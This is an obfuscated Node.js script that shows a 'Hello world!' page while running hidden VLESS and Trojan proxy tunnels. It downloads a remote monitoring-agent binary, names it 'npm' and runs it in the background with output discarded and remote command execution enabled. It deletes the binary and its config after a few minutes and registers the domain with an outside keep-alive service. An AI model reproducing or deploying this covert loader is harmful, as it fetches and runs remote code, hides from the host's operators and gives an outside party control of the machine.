const _0x5064fa=_0x1dd4;function _0x1dd4(_0x25789a,_0xc52039){_0x25789a=_0x25789a-0xa0;const _0x149fb5=_0x149f();let _0x1dd448=_0x149fb5[_0x25789a];return _0x1dd448;}(function(_0x6ac4bb,_0x5289a9){const _0x5e7845=_0x1dd4,_0x32302c=_0x6ac4bb();while(!![]){try{const _0x157b28=-parseInt(_0x5e7845(0xf4))/0x1*(parseInt(_0x5e7845(0xc0))/0x2)+-parseInt(_0x5e7845(0xcb))/0x3+-parseInt(_0x5e7845(0xe5))/0x4+-parseInt(_0x5e7845(0x119))/0x5+-parseInt(_0x5e7845(0x106))/0x6+parseInt(_0x5e7845(0xc1))/0x7*(-parseInt(_0x5e7845(0xec))/0x8)+parseInt(_0x5e7845(0xcd))/0x9*(parseInt(_0x5e7845(0xa0))/0xa);if(_0x157b28===_0x5289a9)break;else _0x32302c['push'](_0x32302c['shift']());}catch(_0x118136){_0x32302c['push'](_0x32302c['shift']());}}}(_0x149f,0xd25c0));const os=require('os'),http=require(_0x5064fa(0xb1)),fs=require('fs'),axios=require(_0x5064fa(0xae)),net=require(_0x5064fa(0x103)),path=require('path'),crypto=require(_0x5064fa(0xa4)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x5064fa(0xe4)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5064fa(0x10f)][_0x5064fa(0xc6)]||'95096302-c00e-4c1a-a527-cc706ec4eb51',NEZHA_SERVER=process[_0x5064fa(0x10f)][_0x5064fa(0xcc)]||'',NEZHA_PORT=process[_0x5064fa(0x10f)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x5064fa(0x113)]||'',DOMAIN=process['env'][_0x5064fa(0x112)]||'1234.abc.com',AUTO_ACCESS=process[_0x5064fa(0x10f)][_0x5064fa(0x110)]||!![],WSPATH=process['env'][_0x5064fa(0xdf)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x5064fa(0x10f)][_0x5064fa(0x108)]||'sub',NAME=process[_0x5064fa(0x10f)][_0x5064fa(0xfd)]||'Hug',PORT=process['env'][_0x5064fa(0xc9)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1c7774=_0x5064fa;try{const _0x7c0308=await axios[_0x1c7774(0xce)]('https://speed.cloudflare.com/meta'),_0x1a2ba6=_0x7c0308[_0x1c7774(0x10c)];ISP=(_0x1a2ba6[_0x1c7774(0xe1)]+'-'+_0x1a2ba6['asOrganization'])['replace'](/ /g,'_');}catch(_0x34a3cc){ISP=_0x1c7774(0xed);}};GetISP();const httpServer=http[_0x5064fa(0xdd)]((_0x261f72,_0xc4f2a6)=>{const _0x42f7f9=_0x5064fa;if(_0x261f72[_0x42f7f9(0x100)]==='/'){const _0xab1d1d=path['join'](__dirname,_0x42f7f9(0xbb));fs[_0x42f7f9(0xf8)](_0xab1d1d,_0x42f7f9(0x10a),(_0x4f0244,_0x3380cf)=>{const _0x1158b9=_0x42f7f9;if(_0x4f0244){_0xc4f2a6[_0x1158b9(0x116)](0xc8,{'Content-Type':_0x1158b9(0xa8)}),_0xc4f2a6[_0x1158b9(0xd4)](_0x1158b9(0xaa));return;}_0xc4f2a6['writeHead'](0xc8,{'Content-Type':_0x1158b9(0xa8)}),_0xc4f2a6[_0x1158b9(0xd4)](_0x3380cf);});return;}else{if(_0x261f72[_0x42f7f9(0x100)]==='/'+SUB_PATH){const _0x465825='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x30a2fd=_0x42f7f9(0xbd)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x42f7f9(0xb2)+DOMAIN+_0x42f7f9(0xa2)+WSPATH+'#'+NAME+'-'+ISP,_0x599d66=_0x465825+'\x0a'+_0x30a2fd,_0x4e62ca=Buffer[_0x42f7f9(0xc2)](_0x599d66)[_0x42f7f9(0xd3)]('base64');_0xc4f2a6['writeHead'](0xc8,{'Content-Type':_0x42f7f9(0xa9)}),_0xc4f2a6['end'](_0x4e62ca+'\x0a');}else _0xc4f2a6[_0x42f7f9(0x116)](0x194,{'Content-Type':'text/plain'}),_0xc4f2a6[_0x42f7f9(0xd4)](_0x42f7f9(0xb4));}}),wss=new WebSocket[(_0x5064fa(0xf6))]({'server':httpServer}),uuid=UUID[_0x5064fa(0x11b)](/-/g,''),DNS_SERVERS=[_0x5064fa(0xf5),'1.1.1.1'];function resolveHost(_0x1362aa){return new Promise((_0x16a112,_0x453ba6)=>{const _0x5923a2=_0x1dd4;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5923a2(0xe7)](_0x1362aa)){_0x16a112(_0x1362aa);return;}let _0x4abb0c=0x0;function _0xf540d6(){const _0x37f1d9=_0x5923a2;if(_0x4abb0c>=DNS_SERVERS[_0x37f1d9(0x117)]){_0x453ba6(new Error(_0x37f1d9(0xd7)+_0x1362aa+_0x37f1d9(0xb3)));return;}const _0x356a53=DNS_SERVERS[_0x4abb0c];_0x4abb0c++;const _0x3009b0=_0x37f1d9(0xa7)+encodeURIComponent(_0x1362aa)+_0x37f1d9(0xbf);axios[_0x37f1d9(0xce)](_0x3009b0,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x36362d=>{const _0x486e33=_0x37f1d9,_0x4976b8=_0x36362d[_0x486e33(0x10c)];if(_0x4976b8[_0x486e33(0x118)]===0x0&&_0x4976b8[_0x486e33(0xba)]&&_0x4976b8[_0x486e33(0xba)]['length']>0x0){const _0x2c77d5=_0x4976b8[_0x486e33(0xba)][_0x486e33(0xda)](_0x545149=>_0x545149[_0x486e33(0xf9)]===0x1);if(_0x2c77d5){_0x16a112(_0x2c77d5['data']);return;}}_0xf540d6();})[_0x37f1d9(0x11a)](_0x3c4ee3=>{_0xf540d6();});}_0xf540d6();});}function handleVlessConnection(_0xeb6e91,_0x5211bd){const _0x25dd28=_0x5064fa,[_0x3a32e8]=_0x5211bd,_0x1732d6=_0x5211bd[_0x25dd28(0xab)](0x1,0x11);if(!_0x1732d6['every']((_0x2c7f1e,_0x5acda7)=>_0x2c7f1e==parseInt(uuid[_0x25dd28(0xa1)](_0x5acda7*0x2,0x2),0x10)))return![];let _0x182dec=_0x5211bd[_0x25dd28(0xab)](0x11,0x12)['readUInt8']()+0x13;const _0x5dbcf7=_0x5211bd[_0x25dd28(0xab)](_0x182dec,_0x182dec+=0x2)['readUInt16BE'](0x0),_0x5e6499=_0x5211bd[_0x25dd28(0xab)](_0x182dec,_0x182dec+=0x1)['readUInt8'](),_0x4f6dec=_0x5e6499==0x1?_0x5211bd[_0x25dd28(0xab)](_0x182dec,_0x182dec+=0x4)[_0x25dd28(0xc3)]('.'):_0x5e6499==0x2?new TextDecoder()[_0x25dd28(0xa3)](_0x5211bd[_0x25dd28(0xab)](_0x182dec+0x1,_0x182dec+=0x1+_0x5211bd[_0x25dd28(0xab)](_0x182dec,_0x182dec+0x1)['readUInt8']())):_0x5e6499==0x3?_0x5211bd[_0x25dd28(0xab)](_0x182dec,_0x182dec+=0x10)['reduce']((_0x3ee55f,_0xa427ef,_0x27ee93,_0x1d69a7)=>_0x27ee93%0x2?_0x3ee55f[_0x25dd28(0x107)](_0x1d69a7[_0x25dd28(0xab)](_0x27ee93-0x1,_0x27ee93+0x1)):_0x3ee55f,[])[_0x25dd28(0xd8)](_0xed2b7e=>_0xed2b7e[_0x25dd28(0x114)](0x0)[_0x25dd28(0xd3)](0x10))[_0x25dd28(0xc3)](':'):'';_0xeb6e91[_0x25dd28(0xf2)](new Uint8Array([_0x3a32e8,0x0]));const _0x3a8304=createWebSocketStream(_0xeb6e91);return resolveHost(_0x4f6dec)['then'](_0x3e22cc=>{const _0x540821=_0x25dd28;net['connect']({'host':_0x3e22cc,'port':_0x5dbcf7},function(){const _0x348205=_0x1dd4;this[_0x348205(0x101)](_0x5211bd[_0x348205(0xab)](_0x182dec)),_0x3a8304['on'](_0x348205(0xe6),()=>{})[_0x348205(0xb9)](this)['on'](_0x348205(0xe6),()=>{})['pipe'](_0x3a8304);})['on'](_0x540821(0xe6),()=>{});})[_0x25dd28(0x11a)](_0x23f4b1=>{const _0x4ce6f9=_0x25dd28;net['connect']({'host':_0x4f6dec,'port':_0x5dbcf7},function(){const _0x21a007=_0x1dd4;this[_0x21a007(0x101)](_0x5211bd[_0x21a007(0xab)](_0x182dec)),_0x3a8304['on']('error',()=>{})[_0x21a007(0xb9)](this)['on'](_0x21a007(0xe6),()=>{})[_0x21a007(0xb9)](_0x3a8304);})['on'](_0x4ce6f9(0xe6),()=>{});}),!![];}function handleTrojanConnection(_0xd41f18,_0x42b1bd){const _0x3cc319=_0x5064fa;try{if(_0x42b1bd[_0x3cc319(0x117)]<0x3a)return![];const _0x41efc2=_0x42b1bd[_0x3cc319(0xab)](0x0,0x38)['toString'](),_0xd8676=[UUID];let _0x38f175=null;for(const _0x4adc53 of _0xd8676){const _0x8c0751=crypto[_0x3cc319(0xeb)](_0x3cc319(0xd0))[_0x3cc319(0xb5)](_0x4adc53)[_0x3cc319(0xdb)](_0x3cc319(0x105));if(_0x8c0751===_0x41efc2){_0x38f175=_0x4adc53;break;}}if(!_0x38f175)return![];let _0x411844=0x38;_0x42b1bd[_0x411844]===0xd&&_0x42b1bd[_0x411844+0x1]===0xa&&(_0x411844+=0x2);const _0x24e52d=_0x42b1bd[_0x411844];if(_0x24e52d!==0x1)return![];_0x411844+=0x1;const _0x401868=_0x42b1bd[_0x411844];_0x411844+=0x1;let _0x31d777,_0x22fd75;if(_0x401868===0x1)_0x31d777=_0x42b1bd[_0x3cc319(0xab)](_0x411844,_0x411844+0x4)[_0x3cc319(0xc3)]('.'),_0x411844+=0x4;else{if(_0x401868===0x3){const _0x227bf0=_0x42b1bd[_0x411844];_0x411844+=0x1,_0x31d777=_0x42b1bd[_0x3cc319(0xab)](_0x411844,_0x411844+_0x227bf0)[_0x3cc319(0xd3)](),_0x411844+=_0x227bf0;}else{if(_0x401868===0x4)_0x31d777=_0x42b1bd[_0x3cc319(0xab)](_0x411844,_0x411844+0x10)['reduce']((_0x33e4dc,_0x255e82,_0x324868,_0x3e86a7)=>_0x324868%0x2?_0x33e4dc[_0x3cc319(0x107)](_0x3e86a7[_0x3cc319(0xab)](_0x324868-0x1,_0x324868+0x1)):_0x33e4dc,[])[_0x3cc319(0xd8)](_0x1a9b58=>_0x1a9b58[_0x3cc319(0x114)](0x0)[_0x3cc319(0xd3)](0x10))['join'](':'),_0x411844+=0x10;else return![];}}_0x22fd75=_0x42b1bd[_0x3cc319(0x114)](_0x411844),_0x411844+=0x2;_0x411844<_0x42b1bd[_0x3cc319(0x117)]&&_0x42b1bd[_0x411844]===0xd&&_0x42b1bd[_0x411844+0x1]===0xa&&(_0x411844+=0x2);const _0x4fd4df=createWebSocketStream(_0xd41f18);return resolveHost(_0x31d777)['then'](_0x2f42d7=>{const _0x36fc88=_0x3cc319;net[_0x36fc88(0xca)]({'host':_0x2f42d7,'port':_0x22fd75},function(){const _0x4d60a1=_0x36fc88;_0x411844<_0x42b1bd[_0x4d60a1(0x117)]&&this[_0x4d60a1(0x101)](_0x42b1bd[_0x4d60a1(0xab)](_0x411844)),_0x4fd4df['on'](_0x4d60a1(0xe6),()=>{})[_0x4d60a1(0xb9)](this)['on'](_0x4d60a1(0xe6),()=>{})[_0x4d60a1(0xb9)](_0x4fd4df);})['on'](_0x36fc88(0xe6),()=>{});})[_0x3cc319(0x11a)](_0x2cdfef=>{const _0x53342a=_0x3cc319;net[_0x53342a(0xca)]({'host':_0x31d777,'port':_0x22fd75},function(){const _0x768c75=_0x53342a;_0x411844<_0x42b1bd[_0x768c75(0x117)]&&this[_0x768c75(0x101)](_0x42b1bd[_0x768c75(0xab)](_0x411844)),_0x4fd4df['on'](_0x768c75(0xe6),()=>{})[_0x768c75(0xb9)](this)['on'](_0x768c75(0xe6),()=>{})[_0x768c75(0xb9)](_0x4fd4df);})['on']('error',()=>{});}),!![];}catch(_0x361513){return![];}}function _0x149f(){const _0x2eb5db=['npm\x20is\x20running','find','digest','trim','createServer','application/json','WSPATH','stream','country','https://','npm','child_process','4187256lFhqTa','error','test','2053','npm\x20running\x20error:','https://oooo.serv00.net/add-url','createHash','360icLYyQ','Unknown','chmod\x20+x\x20npm','utf-8','once','config.yaml','send','\x20-p\x20','3zvLYTZ','8.8.4.4','Server','true','readFile','type','aarch64','log','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NAME','client_secret:\x20','npm\x20download\x20successfully','url','write','unlink','net','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','hex','3327180WRXmBv','concat','SUB_PATH','https://arm64.ssss.nyc.mn/v1','utf8','2083','data','/bin/bash','--tls','env','AUTO_ACCESS','https://amd64.ssss.nyc.mn/agent','DOMAIN','NEZHA_KEY','readUInt16BE','2096','writeHead','length','Status','1104700dCVjWr','catch','replace','420sLdbBT','substr','&path=%2F','decode','crypto','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','arch','https://dns.google/resolve?name=','text/html','text/plain','Hello\x20world!','slice','arm64','connection','axios','2087','split','http','&fp=chrome&type=ws&host=','\x20with\x20all\x20DNS\x20servers','Not\x20Found\x0a','update','close','https://amd64.ssss.nyc.mn/v1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','pipe','Answer','index.html','post','trojan://','8443','&type=A','1114434SwOQJe','65632VgdwNc','from','join','finish','arm','UUID','includes','npm\x20is\x20already\x20running,\x20skip\x20running...','PORT','connect','3536607LcKBqQ','NEZHA_SERVER','1276362uKDEig','get','Server\x20is\x20running\x20on\x20port\x20','sha224','pop','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','toString','end','443','message','Failed\x20to\x20resolve\x20','map'];_0x149f=function(){return _0x2eb5db;};return _0x149f();}wss['on'](_0x5064fa(0xad),(_0x2d2cdb,_0x5ea580)=>{const _0x31ba5d=_0x5064fa,_0x56241a=_0x5ea580[_0x31ba5d(0x100)]||'';_0x2d2cdb[_0x31ba5d(0xf0)](_0x31ba5d(0xd6),_0x2fead3=>{const _0x1a427e=_0x31ba5d;if(_0x2fead3[_0x1a427e(0x117)]>0x11&&_0x2fead3[0x0]===0x0){const _0x25cffe=_0x2fead3[_0x1a427e(0xab)](0x1,0x11),_0x2517bb=_0x25cffe['every']((_0xa8be84,_0x1aa981)=>_0xa8be84==parseInt(uuid[_0x1a427e(0xa1)](_0x1aa981*0x2,0x2),0x10));if(_0x2517bb){!handleVlessConnection(_0x2d2cdb,_0x2fead3)&&_0x2d2cdb[_0x1a427e(0xb6)]();return;}}!handleTrojanConnection(_0x2d2cdb,_0x2fead3)&&_0x2d2cdb[_0x1a427e(0xb6)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x10f757=_0x5064fa,_0x56ae7a=os[_0x10f757(0xa6)]();return _0x56ae7a===_0x10f757(0xc5)||_0x56ae7a===_0x10f757(0xac)||_0x56ae7a===_0x10f757(0xfa)?!NEZHA_PORT?_0x10f757(0x109):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x10f757(0xb7):_0x10f757(0x111);},downloadFile=async()=>{const _0x361eb0=_0x5064fa;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1c73d2=getDownloadUrl(),_0x4b1499=await axios({'method':_0x361eb0(0xce),'url':_0x1c73d2,'responseType':_0x361eb0(0xe0)}),_0x193190=fs['createWriteStream'](_0x361eb0(0xe3));return _0x4b1499[_0x361eb0(0x10c)][_0x361eb0(0xb9)](_0x193190),new Promise((_0x4ab7b1,_0x48ebd3)=>{const _0x5a87f6=_0x361eb0;_0x193190['on'](_0x5a87f6(0xc4),()=>{const _0x58c8ef=_0x5a87f6;console['log'](_0x58c8ef(0xff)),exec(_0x58c8ef(0xee),_0x4bd1ce=>{if(_0x4bd1ce)_0x48ebd3(_0x4bd1ce);_0x4ab7b1();});}),_0x193190['on'](_0x5a87f6(0xe6),_0x48ebd3);});}catch(_0x769418){throw _0x769418;}},runnz=async()=>{const _0x307e6a=_0x5064fa;try{const _0x155e60=execSync(_0x307e6a(0xa5),{'encoding':_0x307e6a(0xef)});if(_0x155e60[_0x307e6a(0xdc)]()!==''){console['log'](_0x307e6a(0xc8));return;}}catch(_0x2bfe66){}await downloadFile();let _0x2c1acc='',_0xa2bb56=[_0x307e6a(0xd5),_0x307e6a(0xbe),_0x307e6a(0x115),_0x307e6a(0xaf),_0x307e6a(0x10b),_0x307e6a(0xe8)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x337ca9=_0xa2bb56['includes'](NEZHA_PORT)?_0x307e6a(0x10e):'';_0x2c1acc='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x307e6a(0xf3)+NEZHA_KEY+'\x20'+_0x337ca9+_0x307e6a(0x104);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3f840c=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x307e6a(0xb0)](':')[_0x307e6a(0xd1)]():'',_0x426251=_0xa2bb56[_0x307e6a(0xc7)](_0x3f840c)?_0x307e6a(0xf7):'false',_0x189bcb=_0x307e6a(0xfe)+NEZHA_KEY+_0x307e6a(0xfc)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x426251+_0x307e6a(0xb8)+UUID;fs['writeFileSync'](_0x307e6a(0xf1),_0x189bcb);}_0x2c1acc=_0x307e6a(0xd2);}else{console[_0x307e6a(0xfb)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x2c1acc,{'shell':_0x307e6a(0x10d)},_0x28e8bf=>{const _0x21ddbe=_0x307e6a;if(_0x28e8bf)console[_0x21ddbe(0xe6)](_0x21ddbe(0xe9),_0x28e8bf);else console[_0x21ddbe(0xfb)](_0x21ddbe(0xd9));});}catch(_0x5b0ea4){console['error']('error:\x20'+_0x5b0ea4);}};async function addAccessTask(){const _0x396604=_0x5064fa;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4c8f6a=_0x396604(0xe2)+DOMAIN;try{const _0x1bcd54=await axios[_0x396604(0xbc)](_0x396604(0xea),{'url':_0x4c8f6a},{'headers':{'Content-Type':_0x396604(0xde)}});console[_0x396604(0xfb)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x3336fe){}}const delFiles=()=>{const _0xe6772d=_0x5064fa;fs[_0xe6772d(0x102)](_0xe6772d(0xe3),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x4d597e=_0x5064fa;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4d597e(0xfb)](_0x4d597e(0xcf)+PORT);});
